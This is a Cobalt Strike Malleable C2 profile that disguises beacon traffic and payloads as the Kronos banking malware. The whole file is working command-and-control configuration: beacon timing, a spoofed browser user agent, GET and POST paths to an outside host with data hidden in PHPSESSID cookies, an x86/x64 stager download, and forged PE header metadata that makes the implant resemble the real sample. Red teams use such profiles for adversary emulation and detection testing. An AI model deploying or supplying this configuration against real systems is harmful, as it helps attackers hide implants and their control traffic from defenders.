#kronos
#https://blog.malwarebytes.com/cybercrime/2017/08/inside-kronos-malware/
#https://blog.malwarebytes.com/cybercrime/2017/08/inside-kronos-malware-p2/
#https://www.hybrid-analysis.com/sample/8389dd850c991127f3b3402dce4201cb693ec0fb7b1e7663fcfa24ef30039851?environmentId=100
#xx0hcd


set sleeptime "30000";
set jitter    "20";
set useragent "Mozilla/5.0 (Windows NT 6.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/32.0.1667.0 Safari/537.36";
set dns_idle "8.8.8.8";
set maxdns    "235";


http-get {

    set uri "/lampi/upload/38bacf4f.exe";
    
    client {

	header "Host" "hjbkjbhkjhbkjhl.info";
	
        
        metadata {
            base64url;
	    prepend "PHPSESSID=";	    
	    header "Cookie";

        }

    }

    server {

	header "Server" "nginx/1.10.2";
	header "Content-Type" "application/octet-stream";
	header "Connection" "close";
	header "ETag" "2ca0669-6d600-557bba73d8218";
	header "Accept-Ranges" "bytes";
        
        output {

            netbios;
	    prepend "MZ....................@..........................!......L..!This Program cannot be run in DOS mode.$...................~........:.....:.....:.....7.{.-...7.D.H..7.E...";

            print;
        }
    }
}

http-post {
    
    set uri "/lampi/connect.php";

    client {

	header "Host" "hjbkjbhkjhbkjhl.info";
	header "Cache-Control" "no-cache";     
        
        output {
            base64url;	    
	    prepend "PHPSESSID=";
	    	    
	    header "Cookie";


        }


        id {
	    base64url;
	    parameter "a";

        }
    }

    server {

	header "Server" "nginx/1.10.2";
	header "Content-Type" "text/html; charset=windows-1251";
	header "X-Powered-By" "PHP/5.3.3";
	header "Cache-Control" "no-store, non-cache, must-revalidate, post-check=0, pre-check=0";
	header "Pragma" "non-cache";
        

        output {
            netbios;	    
	   
            print;
        }
    }
}

http-stager {

    set uri_x86 "/lampi/Connect.php";
    set uri_x64 "/Lampi/connect.php";

    client {
	header "Host" "hjbkjbhkjhbkjhl.info";
	header "Cache-Control" "no-cache";
    }

    server {
	header "Server" "nginx/1.10.2";
	header "Content-Type" "text/html; charset=windows-1251";
	header "X-Powered-By" "PHP/5.3.3";
	header "Cache-Control" "no-store, non-cache, must-revalidate, post-check=0, pre-check=0";
	header "Pragma" "non-cache";
    
    }


}



#from peclone
stage {
	set checksum       "0";
	set compile_time   "23 Aug 2017 10:19:26";
	set entry_point    "37713";
	set image_size_x86 "495616";
	set image_size_x64 "495616";
	set rich_header    "\x07\x4f\x6b\x48\x43\x2e\x05\x1b\x43\x2e\x05\x1b\x43\x2e\x05\x1b\xf7\xb2\xf4\x1b\x49\x2e\x05\x1b\xf7\xb2\xf6\x1b\xc2\x2e\x05\x1b\xf7\xb2\xf7\x1b\x5a\x2e\x05\x1b\x78\x70\x06\x1a\x51\x2e\x05\x1b\x78\x70\x01\x1a\x51\x2e\x05\x1b\x78\x70\x00\x1a\x66\x2e\x05\x1b\x4a\x56\x96\x1b\x44\x2e\x05\x1b\x43\x2e\x04\x1b\x21\x2e\x05\x1b\xd4\x70\x0c\x1a\x42\x2e\x05\x1b\xd1\x70\xfa\x1b\x42\x2e\x05\x1b\xd4\x70\x07\x1a\x42\x2e\x05\x1b\x52\x69\x63\x68\x43\x2e\x05\x1b\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00";
}



